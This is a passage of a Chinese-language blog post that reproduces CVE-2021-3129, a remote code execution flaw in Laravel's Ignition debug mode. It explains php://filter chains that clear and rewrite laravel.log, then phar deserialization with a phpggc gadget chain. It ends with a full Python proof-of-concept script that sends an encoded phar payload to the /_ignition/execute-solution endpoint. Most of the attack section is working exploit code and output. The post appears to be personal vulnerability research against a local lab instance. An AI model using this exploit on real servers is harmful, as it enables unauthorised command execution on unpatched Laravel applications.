class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$expectedTokens</span> !== <span class=\"variable\">$newTokens</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$newContents</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">generateExpectedTokens</span>(<span class=\"params\"><span class=\"keyword\">array</span> <span class=\"variable\">$originalTokens</span>, <span class=\"keyword\">string</span> <span class=\"variable\">$variableName</span></span>): <span class=\"title\">array</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$expectedTokens</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$originalTokens</span> <span class=\"keyword\">as</span> <span class=\"variable\">$token</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$expectedTokens</span>[] = <span class=\"variable\">$token</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$token</span>[<span class=\"number\">0</span>] === T_VARIABLE &amp;&amp; <span class=\"variable\">$token</span>[<span class=\"number\">1</span>] === <span class=\"string\">&#x27;$&#x27;</span>.<span class=\"variable\">$variableName</span>) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$expectedTokens</span>[] = [T_WHITESPACE, <span class=\"string\">&#x27; &#x27;</span>, <span class=\"variable\">$token</span>[<span class=\"number\">2</span>]];</span><br><span class=\"line\">                <span class=\"variable\">$expectedTokens</span>[] = [T_COALESCE, <span class=\"string\">&#x27;??&#x27;</span>, <span class=\"variable\">$token</span>[<span class=\"number\">2</span>]];</span><br><span class=\"line\">                <span class=\"variable\">$expectedTokens</span>[] = [T_WHITESPACE, <span class=\"string\">&#x27; &#x27;</span>, <span class=\"variable\">$token</span>[<span class=\"number\">2</span>]];</span><br><span class=\"line\">                <span class=\"variable\">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class=\"string\">&quot;&#x27;&#x27;&quot;</span>, <span class=\"variable\">$token</span>[<span class=\"number\">2</span>]];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$expectedTokens</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>基本上把程式碼相關的東西看了一遍，可以發現在最後寫入的時候是沒有多餘的檢查的，因此只要前面的東西過了基本上就可以了</li>\n<li>粗略的想法是可以透過 <code>file_get_contents</code> 搭配 php 偽協議構造一個 payload</li>\n<li>本來想搭配 <a href=\"https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT\" target=\"_blank\">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a> 直接寫入 php file 裡面，可是在測試的過程中發現因為後面有檢查的原因導致後面產生的字元無法被相同的 iconv stream filter 解析導致無法寫入</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_put_contents(): iconv stream filter (&quot;UTF8&quot;=&gt;&quot;CSISO2022KR&quot;): invalid multibyte sequence</span><br></pre></td></tr></table></figure>\n<ul>\n<li>這個時候就只能走別的路了</li>\n</ul>\n<h2 id=\"rce\">RCE<a title=\"#rce\" href=\"#rce\"></a></h2>\n<ul>\n<li>參考過原作者的之後看到幾乎所有人都是以 laravel 的 log 搭配 phar 協議的反序列化達到 RCE</li>\n<li><a href=\"https://www.ambionics.io/blog/laravel-debug-rce\" target=\"_blank\">https://www.ambionics.io/blog/laravel-debug-rce</a></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">寫入惡意的錯誤訊息到 log（/var/www/storage/logs/laravel.log）</span><br><span class=\"line\">    -&gt; phar:///var/www/storage/logs/laravel.log/test.txt（RCE）</span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一步的話是先清空目前的所有 log，這個是原作者給的</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/read=consumed/resource=/path/to/storage/logs/laravel.log</span><br></pre></td></tr></table></figure>\n<ul>\n<li>接下來看下如果輸入錯誤的資訊寫入 log 的樣子</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[2023-03-03 11:02:31] local.ERROR: file_get_contents(asdfasdfasdfasdf): failed to open stream: No such file or directory &#123;&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(asdfasdfasdfasdf): failed to open stream: No such file or directory at /var/www/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:78)</span><br><span class=\"line\">[stacktrace]</span><br><span class=\"line\">#0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions-&gt;handleError(2, &#x27;file_get_conten...&#x27;, &#x27;/var/www/vendor...&#x27;, 78, Array)</span><br><span class=\"line\">#1 /var/www/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(78): file_get_contents(&#x27;asdfasdfasdfasd...&#x27;)</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>asdfasdfasdf</code> 是我輸入的，可以發現會有三個地方有 <code>asdfasdfasdf</code></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[log content]payload[log content]payload[log content]</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>為什麼只有兩個 payload 是因為第三個地方會因為太長的關係被卡掉</p>\n</li>\n<li>\n<p>至於 log content 分別是 6928 112 6634，可以簡化成雙數</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[logs]payloads[logs]payloads[logs]</span><br></pre></td></tr></table></figure>\n<ul>\n<li>至於第一個 logs 是特別的，自己測試的時候發現如果直接送 payload 的話，第一個 logs 的地方會是奇數 53，所以為了達成 logs 要是雙數的目標會先送一組無害的而且要是雙數的 payload，這樣第一個 logs 就會是雙數啦</li>\n</ul>\n</li>\n<li>\n<p>還有一件事，payload 會是雙數，所以上面才會是 payloads</p>\n</li>\n<li>\n<p>要把 log content 相關的內容透過 php filter 轉換掉</p>\n</li>\n<li>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>\n<ul>\n<li>大概說如果用 <code>php://filter/write=convert.base64-decode</code> 會把不符合 base64 應該有的字元都處理掉，所以說還要搭配其他的 filter 把 log 的文字弄成不是 base64 應該有的字元，並且可以保留 payload</li>\n<li><a href=\"https://www.php.net/manual/zh/filters.convert.php\" target=\"_blank\">https://www.php.net/manual/zh/filters.convert.php</a></li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$fp</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&#x27;php://output&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">stream_filter_append</span>(<span class=\"variable\">$fp</span>, <span class=\"string\">&#x27;convert.iconv.utf-16le.utf-8&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$fp</span>, <span class=\"string\">&quot;[logs]p\\0a\\0y\\0l\\0o\\0a\\0d\\0s\\0[logs]p\\0a\\0y\\0l\\0o\\0a\\0d\\0s\\0[logs]&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$fp</span>);</span><br><span class=\"line\"><span class=\"comment\">/* 输出：汛杯嵳payloads汛杯嵳payloads汛杯嵳 */</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>需要注意一件事情，filter 吃的字串要是偶數，如果是奇數會報錯，所以說在送 payload 的時候要讓整個文件是偶數的，這個時候可以送兩次讓裡面的內容是平衡的就可以避免掉下面的錯誤</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Warning: fclose(): iconv stream filter (&quot;utf-16le&quot;=&gt;&quot;utf-8&quot;): invalid multibyte sequence</span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以注意到會有兩個 payloads，之後我自己在測試的時候發現如果生成兩個 phar 的 payload</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">__HALT_COMPILER</span>(); <span class=\"meta\">?&gt;</span></span><br><span class=\"line\">xxxO:<span class=\"number\">40</span>:<span class=\"string\">&quot;...&quot;</span>&#123;&#125;xxx<span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">__HALT_COMPILER</span>(); <span class=\"meta\">?&gt;</span></span><br><span class=\"line\">xxxO:<span class=\"number\">40</span>:<span class=\"string\">&quot;...&quot;</span>&#123;&#125;xxx</span><br></pre></td></tr></table></figure>\n<ul>\n<li>會是沒辦法 RCE 的</li>\n<li>如果在 payload 後面加上一個字元可以發現只會生成一個 payload</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$fp</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&#x27;php://output&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">stream_filter_append</span>(<span class=\"variable\">$fp</span>, <span class=\"string\">&#x27;convert.iconv.utf-16le.utf-8&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$fp</span>, <span class=\"string\">&quot;[logs]p\\0a\\0y\\0l\\0o\\0a\\0d\\0s\\0a[logs]p\\0a\\0y\\0l\\0o\\0a\\0d\\0s\\0a[logs]&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$fp</span>);</span><br><span class=\"line\"><span class=\"comment\">/* 输出：汛杯嵳payloads孡潬獧灝愀礀氀漀愀搀猀愀汛杯嵳 */</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>因為 payload 裡面包含空字元，<code>file_get_contents</code> 會報錯</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Warning: file_get_contents() expects parameter 1 to be a valid path, string given in </span><br></pre></td></tr></table></figure>\n<ul>\n<li>搭配 <code>convert.quoted-printable-encode</code> 可以把 <code>=00</code> 轉成 <code>\\0</code> 這樣 payload 裡面的空字元就可以用了 <code>file_get_contents</code> 在讀取得時候也不會有錯誤</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$fp</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&#x27;php://output&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">stream_filter_append</span>(<span class=\"variable\">$fp</span>, <span class=\"string\">&#x27;convert.quoted-printable-encode&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$fp</span>, <span class=\"string\">&quot;This is a test.\\n\\0&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">/* 输出： This is a test.=0A=00  */</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>把上面的 filter 組合起來</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/var/www/storage/logs/laravel.log</span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果要清空可以用上面原作者給的方法也可以再送一次這個組合的 filter，照著上面的原理也是可以把檔案內容清空的</li>\n</ul>\n</li>\n<li>\n<p>到這邊基本上已經可以組出一個完整的攻擊了</p>\n</li>\n<li>\n<p>用 phpggc 選一個 gadget chain，我自己是選擇 <code>Laravel/RCE2</code></p>\n<ul>\n<li><a href=\"https://github.com/ambionics/phpggc\" target=\"_blank\">https://github.com/ambionics/phpggc</a></li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -d <span class=\"string\">&#x27;phar.readonly=0&#x27;</span> ./phpggc -p phar -o /var/www/storage/logs/laravel.log Laravel/RCE2 system <span class=\"built_in\">id</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以用這個 command 測試一下自己選的 gadget chain 能不能跑</li>\n<li>下面是我最後的 poc</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://0.0.0.0:8787/_ignition/execute-solution&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 清掉 log</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">clearLog</span>():</span><br><span class=\"line\">    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">        requests.post(url, json=&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;solution&quot;</span>:<span class=\"string\">&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;parameters&quot;</span>:&#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;variableName&quot;</span>:<span class=\"string\">&quot;test&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;viewFile&quot;</span>:<span class=\"string\">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/var/www/storage/logs/laravel.log&quot;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit</span>():</span><br><span class=\"line\">\t<span class=\"comment\"># 正常的 error log，主要目的是平衡 log 裡面的字數，要是偶數</span></span><br><span class=\"line\">    requests.post(url, json=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;solution&quot;</span>:<span class=\"string\">&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;parameters&quot;</span>:&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;variableName&quot;</span>:<span class=\"string\">&quot;test&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;viewFile&quot;</span>:<span class=\"string\">&quot;ww&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 下面的指令產出的 payload 轉 base64 之後搭配下面的 php 腳本可以產出最後的攻擊 payload</span></span><br><span class=\"line\">    <span class=\"comment\"># php -d &#x27;phar.readonly=0&#x27; ./phpggc -p phar -o z.phar Laravel/RCE2 system id</span></span><br><span class=\"line\">    <span class=\"comment\"># cat z.phar | base64</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># &lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># function ascii2hex($ascii) &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">#     $hex = &#x27;&#x27;;</span></span><br><span class=\"line\">    <span class=\"comment\">#     for ($i = 0; $i &lt; strlen($ascii); $i++) &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">#     $byte = strtoupper(dechex(ord($ascii&#123;$i&#125;)));</span></span><br><span class=\"line\">    <span class=\"comment\">#     $byte = str_repeat(&#x27;0&#x27;, 2 - strlen($byte)).$byte;</span></span><br><span class=\"line\">    <span class=\"comment\">#     $hex.=$byte.&quot;&quot;;</span></span><br><span class=\"line\">    <span class=\"comment\">#     &#125;</span></span><br><span class=\"line\">    <span class=\"comment\">#     return $hex;</span></span><br><span class=\"line\">    <span class=\"comment\"># &#125;</span></span><br><span class=\"line\">    <span class=\"comment\"># $ser_payload = &quot;PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQr0AAAAAQAAABEAAAABAAAAAAC+AAAATzo0MDoi</span></span><br><span class=\"line\">    <span class=\"comment\"># SWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVu</span></span><br><span class=\"line\">    <span class=\"comment\"># dHMiO086Mjg6IklsbHVtaW5hdGVcRXZlbnRzXERpc3BhdGNoZXIiOjE6e3M6MTI6IgAqAGxpc3Rl</span></span><br><span class=\"line\">    <span class=\"comment\"># bmVycyI7YToxOntzOjI6ImlkIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX19czo4OiIAKgBldmVu</span></span><br><span class=\"line\">    <span class=\"comment\"># dCI7czoyOiJpZCI7fQgAAAB0ZXN0LnR4dAQAAADIhARkBAAAAAx+f9ikAQAAAAAAAHRlc3RhFVCf</span></span><br><span class=\"line\">    <span class=\"comment\"># e6R7j1EiNl54coN/+7RQcAIAAABHQk1C&quot;;</span></span><br><span class=\"line\">    <span class=\"comment\"># $convert_ser_payload = &quot;&quot;;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># foreach (str_split($ser_payload) as $char) &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">#     $convert_ser_payload .= &quot;=&quot; . ascii2hex($char) . &quot;=00&quot;;</span></span><br><span class=\"line\">    <span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># echo $convert_ser_payload . &quot;\\n&quot;;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># ?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 攻擊 payload</span></span><br><span class=\"line\">    requests.post(url, json=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;solution&quot;</span>:<span class=\"string\">&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;parameters&quot;</span>:&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;variableName&quot;</span>:<span class=\"string\">&quot;test&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;viewFile&quot;</span>:<span class=\"string\">&quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=30=00=41=00=41=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=2B=00=41=00=41=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=0A=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=0A=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=52=00=58=00=5A=00=6C=00=62=00=6E=00=52=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=49=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=78=00=70=00=63=00=33=00=52=00=6C=00=0A=00=62=00=6D=00=56=00=79=00=63=00=79=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=49=00=36=00=49=00=6D=00=6C=00=6B=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=0A=00=64=00=43=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4F=00=69=00=4A=00=70=00=5A=00=43=00=49=00=37=00=66=00=51=00=67=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=6E=00=52=00=34=00=64=00=41=00=51=00=41=00=41=00=41=00=44=00=49=00=68=00=41=00=52=00=6B=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=6B=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=52=00=68=00=46=00=56=00=43=00=66=00=0A=00=65=00=36=00=52=00=37=00=6A=00=31=00=45=00=69=00=4E=00=6C=00=35=00=34=00=63=00=6F=00=4E=00=2F=00=2B=00=37=00=52=00=51=00=63=00=41=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 把 payload 轉成可以用 phar 協議解析的樣子</span></span><br><span class=\"line\">    requests.post(url, json=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;solution&quot;</span>:<span class=\"string\">&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;parameters&quot;</span>:&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;variableName&quot;</span>:<span class=\"string\">&quot;test&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;viewFile&quot;</span>:<span class=\"string\">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/var/www/storage/logs/laravel.log&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 以 phar 協議反序列化裡面的內容</span></span><br><span class=\"line\">    response = requests.post(url, json=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;solution&quot;</span>:<span class=\"string\">&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;parameters&quot;</span>:&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;variableName&quot;</span>:<span class=\"string\">&quot;test&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;viewFile&quot;</span>:<span class=\"string\">&quot;phar:///var/www/storage/logs/laravel.log/a&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(response.text.split(<span class=\"string\">&quot;&lt;/html&gt;&quot;</span>)[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">clearLog()</span><br><span class=\"line\">exploit()</span><br></pre></td></tr></table></figure>","prev":{"title":"NodeJS template CVEs","link":"2023/03/06/NodeJS-template-CVEs"},"plink":"https://entroychang.github.io/2023/03/01/CVE-2021-3129/","toc":[{"id":"漏洞成因","title":"漏洞成因","index":"1"},{"id":"復現","title":"復現","index":"2","children":[{"id":"造成漏洞（？","title":"造成漏洞（？","index":"2.1"},{"id":"分析","title":"分析","index":"2.2"}]},{"id":"rce","title":"RCE","index":"3"}],"reading_time":"3608 words in 24 min"}